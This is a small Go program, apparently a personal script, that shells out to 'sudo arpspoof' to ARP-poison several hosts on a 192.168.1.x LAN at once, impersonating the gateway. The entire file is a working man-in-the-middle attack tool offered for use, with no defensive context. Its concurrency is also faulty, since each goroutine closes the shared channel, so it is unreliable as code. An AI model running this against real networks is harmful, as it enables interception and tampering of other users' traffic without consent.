// sudo arpspoof -i enp2s0 -t 192.168.1.7 -r 192.168.1.1
package main

import (
	"bufio"
	"fmt"
	"log"
	"os/exec"
	"strconv"
	"sync"
)

const (
	sudo        = "sudo"
	cmd         = "arpspoof"
	intrfc_flag = "-i"
	intrfc      = "enp2s0"
	target_flag = "-t"
	host_flag   = "-r"
	host        = "192.168.1.1"
)

func arp(ch chan<- string, wg *sync.WaitGroup, target string) {
	defer wg.Done()

	log.Println(sudo, cmd, intrfc_flag, intrfc, target_flag, target, host_flag, host)
	command := exec.Command(sudo, cmd, intrfc_flag, intrfc, target_flag, target, host_flag, host)

	reader, err := command.StderrPipe()
	if err != nil {
		ch <- err.Error()
		close(ch)
	}

	scanner := bufio.NewScanner(reader)
	go func() {
		for scanner.Scan() {
			ch <- scanner.Text()
		}
	}()

	err = command.Run()
	if err != nil {
		ch <- err.Error()
		close(ch)
	}
	close(ch)
}

func main() {
	var wg sync.WaitGroup

	wg.Add(7)

	ch := make(chan string, 7)

	for i := 2; i < 10; i++ {
		if i == 5 {
			continue
		}

		target := fmt.Sprintf("192.168.1.%v", strconv.Itoa(i))

		go arp(ch, &wg, target)
	}

	for msg := range ch {
		log.Println(msg)
	}

	wg.Wait()
}
